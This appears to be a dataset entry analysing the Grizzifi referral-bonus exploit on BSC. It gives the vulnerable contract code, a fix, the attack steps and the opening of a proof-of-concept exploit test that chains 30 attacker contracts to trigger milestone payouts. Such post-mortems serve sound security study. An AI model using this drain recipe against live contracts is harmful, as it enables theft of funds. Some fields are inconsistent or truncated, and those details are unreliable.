@@ -1,0 +1,37 @@
+{
+ "id": "2025__2025-08-13_Grizzifi_TeamCountManipulation",
+ "source_file": "2025/2025-08-13_Grizzifi_TeamCountManipulation.md",
+ "title": "Grizzifi — Bonus Drain via Team Count Manipulation Analysis",
+ "date": "2025-08-13",
+ "protocol": "Grizzifi",
+ "chain": "BSC",
+ "loss_raw": "~61,000 USD",
+ "loss_usd": null,
+ "root_cause": "`_incrementUplineTeamCount()` calculates team count using cumulative investment (including withdrawals) instead of active investment",
+ "attack_tx": "0x36438165",
+ "vulnerable_contract": "0x21ab8943380b752306abf4d49c203b011a89266b",
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "❌ Vulnerable logic: team count calculated using cumulative investment (including withdrawals)\nfunction _incrementUplineTeamCount(address referrer, uint256 amount) internal {\n    address upline = referrer;\n    for (uint256 i = 0; i < 10; i++) {\n        if (upline == address(0)) break;\n        //",
+  "❌ totalInvested does not decrease after withdrawal\n        if (userInfo[upline].totalInvested >= MILESTONE_THRESHOLD) {\n            // Milestone reached, pay bonus\n            _payMilestoneBonus(upline);\n        }\n        upline = userInfo[upline].referrer;\n    }\n}\n\n//",
+  "// From: Grizzifi.sol\n\nuint256 public minInvestForMilestone = 10 * 1e18;  // 10 BSC-USD minimum to qualify\nuint256 public minDirect = 2;                       // minimum direct referrals to claim milestone reward\n\nuint256[] public teamMilestones = [20, 50, 100, 200, 500, 1000, 3000, 6000, 10000, 30000];\nuint256[] public rewardAmounts   = [\n    50 * 1e18, 120 * 1e18, 220 * 1e18, 440 * 1e18, 800 * 1e18,\n    1600 * 1e18, 2500 * 1e18, 4500 * 1e18, 7500 * 1e18, 15000 * 1e18\n];\n\nmapping(address => User) public users;\n// User.totalInvested: cumulative, never decremented on withdrawal\n// User.teamsCount: number of unique sub-tree members counted by _incrementUplineTeamCount\n// User.inTeam[addr]: tracks whether addr has already been counted for this upline\n\nfunction harvestHoney(uint256 _planId, uint256 _amount, address _referrer) external {\n    // ... registration logic ...\n    if (_amount >= minInvestForMilestone) {\n        _incrementUplineTeamCount(msg.sender); // ❌ called BEFORE updating totalInvested\n    }\n    // ... USDT transfer and investment storage ...\n    users[msg.sender].totalInvested += _amount; // totalInvested grows but never shrinks\n    totalInvested += _amount;\n    emit NewInvestment(msg.sender, _planId, _amount, users[msg.sender].referrer);\n}\n\nfunction _incrementUplineTeamCount(address _user) internal {\n    address upline = users[_user].referrer;\n    for (uint8 i = 0; i < 30; i++) {\n        if (upline == address(0)) break;\n\n        if (users[upline].totalInvested >= minInvestForMilestone) { // ❌ totalInvested never decreases — always qualifies after first deposit\n            if (!users[upline].inTeam[_user]) {\n                if (i == 0 && !users[_user].inDirect) {\n                    users[_user].inDirect = true;\n                    users[upline].directCount++;\n                }\n                users[upline].inTeam[_user] = true; // ❌ inTeam[_user] only prevents the SAME _user from being counted twice\n                users[upline].teamsCount++;          // ❌ but each new sub-contract is a fresh address → always inTeam=false\n\n                uint256 index = users[upline].milestoneIndex;\n                if (\n                    index < teamMilestones.length &&\n                    users[upline].teamsCount == teamMilestones[index]  // milestone triggered\n                ) {\n                    if (users[upline].directCount >= minDirect) {\n                        uint256 reward = rewardAmounts[index];\n                        users[upline].milestoneReward += reward;        // ❌ reward credited without active-balance check\n                        users[upline].totalMilestoneEarned += reward;\n                        emit MilestoneAchieved(upline, users[upline].milestoneIndex, reward);\n                    }\n                    users[upline].milestoneIndex++;\n                }\n            } else {\n                break;\n            }\n        }\n        upline = users[upline].referrer;\n    }\n}"
+ ],
+ "code_after": [
+  "✅ Fix: calculate using active investment (activeInvestment)\nfunction _incrementUplineTeamCount(address referrer, uint256 amount) internal {\n    address upline = referrer;\n    for (uint256 i = 0; i < 10; i++) {\n        if (upline == address(0)) break;\n        //",
+  "✅ activeInvestment = totalInvested - totalWithdrawn\n        if (userInfo[upline].activeInvestment >= MILESTONE_THRESHOLD) {\n            _payMilestoneBonus(upline);\n        }\n        upline = userInfo[upline].referrer;\n    }\n}"
+ ],
+ "steps": [
+  "1 ▶ Deploy 30 AttackContract1s (each holding 20 BSC-USD)",
+  "2 ▶ Build chain structure (ac[0] referrer=0, ac[1] referrer=ac[0], ...)",
+  "3 ▶ Execute each ac.init(GRIZZIFI, prevAC) in order:",
+  "AttackContract2.run() → re-execute harvestHoney(10 BSC-USD)",
+  "4 ▶ _incrementUplineTeamCount repeatedly triggered → milestones reached",
+  "5 ▶ ac.withdraw(GRIZZIFI) × 30 → collectRefBonus() executed"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─1─▶ Deploy 30 AttackContract1s (each holding 20 BSC-USD)\n  │\n  ├─2─▶ Build chain structure (ac[0] referrer=0, ac[1] referrer=ac[0], ...)\n  │         └─ Form 30-level upline chain\n  │\n  ├─3─▶ Execute each ac.init(GRIZZIFI, prevAC) in order:\n  │         ├─ harvestHoney(planId=0, amount=10 BSC-USD, referrer=prevAC)\n  │         └─ AttackContract2.run() → re-execute harvestHoney(10 BSC-USD)\n  │         └─ totalInvested += 20 BSC-USD (persists even after withdrawal)\n  │\n  ├─4─▶ _incrementUplineTeamCount repeatedly triggered → milestones reached\n  │         └─ Referral bonuses + milestone bonuses accumulate\n  │\n  └─5─▶ ac.withdraw(GRIZZIFI) × 30 → collectRefBonus() executed\n         └─ Claim ~61,000 USD worth of BSC-USD bonuses",
+  "contract Grizzifi is BaseTestWithBalanceLog {\n    address[] public attackContracts = new address[](30);\n\n    function testExploit() public balanceLog {\n        // Step 1: Deploy 30 attack contracts, fund each with 20 BSC-USD\n        for (uint256 i = 0; i < 30; i++) {\n            AttackContract1 ac1 = new AttackContract1();\n            attackContracts[i] = address(ac1);\n            IERC20(BSC_USD).transfer(address(ac1), 20 ether);\n        }\n\n        // Step 2: Execute harvestHoney in chain structure\n        // Inflate totalInvested to reach team count milestones\n        address regCenter = address(0);\n        for (uint256 i = 0; i < 30; i++) {\n            address ac1 = attackContracts[i];\n            AttackContract1(ac1).init(GRIZZIFI, regCenter);\n            regCenter = ac1;\n        }\n\n   "
+ ]
+}
